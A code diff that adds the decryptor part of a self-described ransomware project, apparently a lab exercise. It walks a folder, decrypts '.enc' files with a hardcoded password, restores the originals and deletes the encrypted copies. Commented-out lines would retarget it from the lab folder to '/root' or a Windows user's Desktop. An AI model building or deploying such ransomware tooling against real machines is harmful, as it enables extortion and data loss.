@@ -4,3 +4,66 @@ from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import platform  # Importing platform module
+from helpers import derive_key, PASSWORD, TOKEN
+
+def decrypt_data(encrypted_data: bytes, password: str) -> bytes:
+    salt = encrypted_data[:16]
+    iv = encrypted_data[16:32]
+    key = derive_key(password, salt)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(encrypted_data[32:]) + decryptor.finalize()
+    unpadder = padding.PKCS7(128).unpadder()
+    data = unpadder.update(padded_data) + unpadder.finalize()
+    return data
+
+def decrypt_file(file_path: str, password: str) -> None:
+    with open(file_path, "rb") as f:
+        encrypted_data = f.read()
+    data = decrypt_data(encrypted_data, password)
+    original_file_path = file_path.replace(".enc", "")
+    with open(original_file_path, "wb") as f:
+        f.write(data)
+    os.remove(file_path)
+    print(f"Decrypted and deleted {file_path} -> {original_file_path}")
+
+def decrypt_folder(folder_path: str, password: str) -> None:
+    for root, _, files in os.walk(folder_path):
+        for file in files:
+            if file.endswith(".enc"):
+                file_path = os.path.join(root, file)
+                decrypt_file(file_path, password)
+
+def main():
+    ascii_art = """
+      _____                                                                              
+     |  __ \                                                                             
+     | |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
+     |  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
+     | | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
+     |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
+    """
+    print(ascii_art)
+
+    # Detect operating system
+    #os_type = platform.system()
+    #if os_type == "Windows":
+     #       target = r"C:\\Users\\%USERNAME%\\Desktop\\Nik"
+    #elif os_type == "Linux":
+     #   target = "/root"
+    #else:
+     #   print("Unsupported OS.")
+      #  return
+
+    # Automatically decrypt based on detected OS
+    target = "/home/shfana/ransomware-lab/test2"
+    if os.path.isdir(target):
+        decrypt_folder(target, PASSWORD)
+        print(f"Decrypted all files in {target}")
+    else:
+        print(f"Invalid target directory: {target}")
+
+if __name__ == "__main__":
+    main()
+
+	
